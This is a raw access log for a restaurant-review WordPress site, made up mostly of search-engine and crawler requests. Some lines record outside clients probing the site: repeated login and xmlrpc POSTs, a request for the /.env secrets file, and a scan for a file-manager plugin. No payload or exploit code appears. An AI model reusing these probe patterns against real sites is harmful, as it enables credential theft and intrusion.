217.113.194.0 - - [01/Dec/2023:00:00:05 -0500] "GET /manhattan/chandni-restaurant HTTP/1.1" 200 32370 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:02:50 -0500] "GET /queens/farid-kebab/feed HTTP/1.1" 200 781 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:05:30 -0500] "GET /chinese/xian-famous-foods/feed HTTP/1.1" 200 804 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:08:16 -0500] "GET /san-francisco/thechairman/feed HTTP/1.1" 200 796 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:11:00 -0500] "GET /manhattan/minetta-tavern/feed HTTP/1.1" 200 796 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
47.76.35.0 - - [01/Dec/2023:00:12:26 -0500] "HEAD / HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2813.72 Safari/537.36" "-"
47.76.35.0 - - [01/Dec/2023:00:12:27 -0500] "HEAD / HTTP/1.1" 200 - www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2813.72 Safari/537.36" "-"
47.76.35.0 - - [01/Dec/2023:00:12:27 -0500] "GET / HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2813.72 Safari/537.36" "-"
47.76.35.0 - - [01/Dec/2023:00:12:28 -0500] "GET / HTTP/1.1" 200 54800 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2813.72 Safari/537.36" "-"
47.76.35.0 - - [01/Dec/2023:00:12:56 -0500] "HEAD / HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2352.119 Safari/537.36" "-"
47.76.35.0 - - [01/Dec/2023:00:12:57 -0500] "HEAD / HTTP/1.1" 200 - www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2352.119 Safari/537.36" "-"
47.76.35.0 - - [01/Dec/2023:00:12:57 -0500] "GET / HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2352.119 Safari/537.36" "-"
47.76.35.0 - - [01/Dec/2023:00:12:58 -0500] "GET / HTTP/1.1" 200 54800 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2352.119 Safari/537.36" "-"
217.113.194.0 - - [01/Dec/2023:00:13:46 -0500] "GET /manhattan/woorijip/feed HTTP/1.1" 200 778 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:16:30 -0500] "GET /uncategorized/mum-feteer/feed HTTP/1.1" 200 792 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:19:11 -0500] "GET /uncategorized/le-bernardin/feed HTTP/1.1" 200 798 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:21:53 -0500] "GET /uncategorized/grimm-artisanal-ales HTTP/1.1" 200 29120 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
52.167.144.0 - - [01/Dec/2023:00:22:51 -0500] "GET /wp-sitemap-posts-post-1.xml HTTP/1.1" 200 3739 www.edibledialect.com "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" "-"
2604:a880:: - - [01/Dec/2023:00:23:40 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
2604:a880:: - - [01/Dec/2023:00:23:52 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
2604:a880:: - - [01/Dec/2023:00:23:52 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
217.113.194.0 - - [01/Dec/2023:00:24:34 -0500] "GET /queens/chivito-de-oro HTTP/1.1" 200 31397 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
52.91.5.0 - - [01/Dec/2023:00:26:26 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "-" "ClaudeBot" "-"
52.91.5.0 - - [01/Dec/2023:00:26:51 -0500] "GET /queens/point-brazil HTTP/1.1" 200 31032 www.edibledialect.com "-" "ClaudeBot" "-"
217.113.194.0 - - [01/Dec/2023:00:27:16 -0500] "GET /queens/woodside-cafe/feed HTTP/1.1" 200 787 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:30:12 -0500] "GET /chinese/drunken-dumpling/feed HTTP/1.1" 200 798 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
74.208.59.0 - - [01/Dec/2023:00:30:13 -0500] "POST /wp-cron.php?doing_wp_cron=1701408613.0344300270080566406250 HTTP/1.1" 200 - www.edibledialect.com "http://www.edibledialect.com/wp-cron.php?doing_wp_cron=1701408613.0344300270080566406250" "WordPress/5.5.13; http://www.edibledialect.com" "-"
217.113.194.0 - - [01/Dec/2023:00:33:03 -0500] "GET /japanese/sake-bar-hagi/feed HTTP/1.1" 200 791 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
213.180.203.0 - - [01/Dec/2023:00:34:31 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
213.180.203.0 - - [01/Dec/2023:00:34:32 -0500] "GET /uncategorized/you-only-live-twice HTTP/1.1" 404 18399 www.edibledialect.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
93.107.1.0 - - [01/Dec/2023:00:35:15 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0" "-"
8.214.83.0 - - [01/Dec/2023:00:35:17 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "-"
175.100.150.0 - - [01/Dec/2023:00:35:28 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/20.6.14" "-"
2001:41d0:: - - [01/Dec/2023:00:35:30 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "-"
91.121.232.0 - - [01/Dec/2023:00:35:33 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36" "-"
175.100.150.0 - - [01/Dec/2023:00:35:35 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" "-"
2600:3c00:: - - [01/Dec/2023:00:35:39 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0" "-"
93.107.1.0 - - [01/Dec/2023:00:35:40 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36" "-"
203.107.129.0 - - [01/Dec/2023:00:35:52 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
217.113.194.0 - - [01/Dec/2023:00:35:53 -0500] "GET /japanese/sake-bar-decibel HTTP/1.1" 200 31576 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
2402:1f00:8000:: - - [01/Dec/2023:00:35:57 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "-"
217.113.194.0 - - [01/Dec/2023:00:38:43 -0500] "GET /manhattan/chandni-restaurant/feed HTTP/1.1" 200 808 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
51.222.253.0 - - [01/Dec/2023:00:39:52 -0500] "GET /category/nepalese HTTP/1.1" 200 30780 www.edibledialect.com "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "-"
217.113.194.0 - - [01/Dec/2023:00:41:27 -0500] "GET /uncategorized/sushi-noz/feed HTTP/1.1" 200 789 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
103.118.205.0 - - [01/Dec/2023:00:43:43 -0500] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 18399 www.edibledialect.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" "-"
217.113.194.0 - - [01/Dec/2023:00:44:09 -0500] "GET /queens/red-top-mountain-restaurant HTTP/1.1" 200 32488 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:46:54 -0500] "GET /queens/chivito-de-oro/feed HTTP/1.1" 200 790 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
158.220.103.0 - - [01/Dec/2023:00:49:02 -0500] "GET /.env HTTP/1.1" 301 - edibledialect.com "-" "python-requests/2.26.0" "-"
158.220.103.0 - - [01/Dec/2023:00:49:03 -0500] "GET /.env HTTP/1.1" 404 18399 www.edibledialect.com "-" "python-requests/2.26.0" "-"
158.220.103.0 - - [01/Dec/2023:00:49:03 -0500] "POST / HTTP/1.1" 200 54800 edibledialect.com "-" "python-requests/2.26.0" "-"
217.113.194.0 - - [01/Dec/2023:00:49:41 -0500] "GET /queens/friendship-bbq/feed HTTP/1.1" 200 790 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
188.40.94.0 - - [01/Dec/2023:00:50:09 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
43.153.11.0 - - [01/Dec/2023:00:50:11 -0500] "GET / HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
43.153.11.0 - - [01/Dec/2023:00:50:13 -0500] "GET / HTTP/1.1" 200 54810 www.edibledialect.com "http://edibledialect.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
188.40.94.0 - - [01/Dec/2023:00:50:27 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
188.40.94.0 - - [01/Dec/2023:00:50:28 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
217.113.194.0 - - [01/Dec/2023:00:52:23 -0500] "GET /hawaii/taniokas-seafoods-catering HTTP/1.1" 200 31722 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:00:55:07 -0500] "GET /japanese/sake-bar-decibel/feed HTTP/1.1" 200 800 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
2a03:cfc0:8000:: - - [01/Dec/2023:00:56:32 -0500] "GET / HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "-"
2a03:cfc0:8000:: - - [01/Dec/2023:00:56:33 -0500] "GET / HTTP/1.1" 200 54800 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "-"
2a03:cfc0:8000:: - - [01/Dec/2023:00:56:35 -0500] "GET /about HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "-"
2a03:cfc0:8000:: - - [01/Dec/2023:00:56:36 -0500] "GET /about HTTP/1.1" 200 20296 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "-"
217.113.194.0 - - [01/Dec/2023:00:57:47 -0500] "GET /uncategorized/grimm-artisanal-ales/feed HTTP/1.1" 200 822 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:01:00:33 -0500] "GET /queens/red-top-mountain-restaurant/feed HTTP/1.1" 200 829 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:01:03:21 -0500] "GET /queens/al-sham-sweets-pastries HTTP/1.1" 200 31778 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:01:06:03 -0500] "GET /queens/tikka-indian-grill-astoria HTTP/1.1" 200 32030 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:01:08:51 -0500] "GET /hawaii/taniokas-seafoods-catering/feed HTTP/1.1" 200 840 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
2a02:598:: - - [01/Dec/2023:01:10:30 -0500] "GET /queens/fu-run HTTP/1.1" 200 31210 www.edibledialect.com "-" "Mozilla/5.0 (compatible; SeznamBot/4.0; +http://napoveda.seznam.cz/seznambot-intro/)" "-"
217.113.194.0 - - [01/Dec/2023:01:11:37 -0500] "GET /uncategorized/blue-hill-at-stone-barns HTTP/1.1" 200 29367 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:01:14:21 -0500] "GET /queens/al-sham-sweets-pastries/feed HTTP/1.1" 200 824 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
3.86.67.0 - - [01/Dec/2023:01:15:22 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "-" "ClaudeBot" "-"
3.86.67.0 - - [01/Dec/2023:01:15:27 -0500] "GET /page/3 HTTP/1.1" 200 69574 www.edibledialect.com "-" "ClaudeBot" "-"
217.113.194.0 - - [01/Dec/2023:01:17:06 -0500] "GET /queens/shuya-cafe-queens-astoria-ramen HTTP/1.1" 200 34316 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
162.247.74.0 - - [01/Dec/2023:01:17:52 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75" "-"
162.247.74.0 - - [01/Dec/2023:01:17:53 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75" "-"
162.247.74.0 - - [01/Dec/2023:01:17:54 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75" "-"
162.247.74.0 - - [01/Dec/2023:01:17:55 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75" "-"
162.247.74.0 - - [01/Dec/2023:01:17:56 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75" "-"
217.113.194.0 - - [01/Dec/2023:01:20:02 -0500] "GET /queens/tikka-indian-grill-astoria/feed HTTP/1.1" 200 826 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:01:22:59 -0500] "GET /uncategorized/blue-hill-at-stone-barns/feed HTTP/1.1" 200 834 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
217.113.194.0 - - [01/Dec/2023:01:25:47 -0500] "GET /queens/shuya-cafe-queens-astoria-ramen/feed HTTP/1.1" 200 820 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)" "-"
209.141.54.0 - - [01/Dec/2023:01:27:00 -0500] "GET /wp-login.php HTTP/1.1" 200 6678 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36" "-"
209.141.54.0 - - [01/Dec/2023:01:27:12 -0500] "POST /wp-login.php HTTP/1.1" 200 7108 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36" "-"
74.208.59.0 - - [01/Dec/2023:01:40:11 -0500] "POST /wp-cron.php?doing_wp_cron=1701412811.7540640830993652343750 HTTP/1.1" 200 - www.edibledialect.com "http://www.edibledialect.com/wp-cron.php?doing_wp_cron=1701412811.7540640830993652343750" "WordPress/5.5.13; http://www.edibledialect.com" "-"
35.92.121.0 - - [01/Dec/2023:01:40:11 -0500] "GET / HTTP/1.1" 200 54810 www.edibledialect.com "-" "Mozilla/5.0 (iPad; CPU OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" "-"
35.92.121.0 - - [01/Dec/2023:01:40:34 -0500] "GET //static.addtoany.com/menu/page.js HTTP/1.1" 301 - www.edibledialect.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" "-"
35.92.121.0 - - [01/Dec/2023:01:40:34 -0500] "GET //www.edibledialect.com/wp-content/themes/mytheme/js/total-min.js HTTP/1.1" 301 - www.edibledialect.com "-" "Mozilla/3.01Gold (Win95; I)" "-"
35.92.121.0 - - [01/Dec/2023:01:40:34 -0500] "GET //code.jquery.com/jquery-latest.min.js HTTP/1.1" 301 - www.edibledialect.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" "-"
35.92.121.0 - - [01/Dec/2023:01:40:34 -0500] "GET //www.edibledialect.com/wp-includes/js/jquery/jquery.js HTTP/1.1" 301 - www.edibledialect.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A356 Safari/604.1" "-"
35.92.121.0 - - [01/Dec/2023:01:40:34 -0500] "GET //www.edibledialect.com/wp-content/plugins/add-to-any/addtoany.min.js HTTP/1.1" 301 - www.edibledialect.com "-" "Mozilla/5.0 (Linux; Android 9; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36" "-"
35.92.121.0 - - [01/Dec/2023:01:40:34 -0500] "GET //www.edibledialect.com/wp-content/themes/mytheme/js/plugins/html5.js HTTP/1.1" 301 - www.edibledialect.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" "-"
35.92.121.0 - - [01/Dec/2023:01:40:34 -0500] "GET //www.edibledialect.com/wp-includes/js/wp-embed.min.js HTTP/1.1" 301 - www.edibledialect.com "-" "Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)" "-"
35.92.121.0 - - [01/Dec/2023:01:40:34 -0500] "GET /wp-emoji-release.min.js HTTP/1.1" 404 18409 www.edibledialect.com "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4" "-"
159.203.165.0 - - [01/Dec/2023:01:43:05 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
159.203.165.0 - - [01/Dec/2023:01:43:17 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
159.203.165.0 - - [01/Dec/2023:01:43:17 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
179.43.159.0 - - [01/Dec/2023:01:48:19 -0500] "GET /wp-login.php/wp-login.php HTTP/1.1" 200 6678 edibledialect.com "http://edibledialect.com/wp-login.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15" "-"
179.43.159.0 - - [01/Dec/2023:01:48:20 -0500] "POST /wp-login.php/wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "-" "-"
51.222.253.0 - - [01/Dec/2023:01:51:42 -0500] "GET /tag/japanese HTTP/1.1" 200 29055 www.edibledialect.com "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "-"
52.167.144.0 - - [01/Dec/2023:02:02:22 -0500] "GET /uncategorized/blue-hill-at-stone-barns HTTP/1.1" 200 29426 www.edibledialect.com "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" "-"
148.72.211.0 - - [01/Dec/2023:02:07:14 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
148.72.211.0 - - [01/Dec/2023:02:07:26 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
148.72.211.0 - - [01/Dec/2023:02:07:26 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
192.42.116.0 - - [01/Dec/2023:02:12:20 -0500] "GET /wp-login.php/wp-login.php HTTP/1.1" 200 6678 edibledialect.com "http://edibledialect.com/wp-login.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15" "-"
192.42.116.0 - - [01/Dec/2023:02:12:20 -0500] "POST /wp-login.php/wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "-" "-"
54.91.224.0 - - [01/Dec/2023:02:16:33 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "-" "ClaudeBot" "-"
54.91.224.0 - - [01/Dec/2023:02:16:36 -0500] "GET /uncategorized/aquavit HTTP/1.1" 200 28591 www.edibledialect.com "-" "ClaudeBot" "-"
52.55.102.0 - - [01/Dec/2023:02:22:15 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "-" "ClaudeBot" "-"
52.55.102.0 - - [01/Dec/2023:02:22:16 -0500] "GET /uncategorized/marea HTTP/1.1" 200 28895 www.edibledialect.com "-" "ClaudeBot" "-"
2a02:598:: - - [01/Dec/2023:02:22:44 -0500] "GET /queens/queens.htm HTTP/1.1" 304 - www.edibledialect.com "-" "Mozilla/5.0 (compatible; SeznamBot/4.0; +http://napoveda.seznam.cz/seznambot-intro/)" "-"
192.44.68.0 - - [01/Dec/2023:02:26:03 -0500] "GET /wp-content/uploads/2016/12/phayul.jpg HTTP/1.1" 200 41653 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" "-"
74.208.59.0 - - [01/Dec/2023:02:28:00 -0500] "POST /wp-cron.php?doing_wp_cron=1701415680.6274020671844482421875 HTTP/1.1" 200 - www.edibledialect.com "http://www.edibledialect.com/wp-cron.php?doing_wp_cron=1701415680.6274020671844482421875" "WordPress/5.5.13; http://www.edibledialect.com" "-"
66.249.75.0 - - [01/Dec/2023:02:28:00 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.75.0 - - [01/Dec/2023:02:28:12 -0500] "GET /sitemap-pt-customize_changeset-2017-05.xml HTTP/1.1" 200 400 www.edibledialect.com "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
185.220.101.0 - - [01/Dec/2023:02:34:01 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" "-"
185.220.101.0 - - [01/Dec/2023:02:34:02 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" "-"
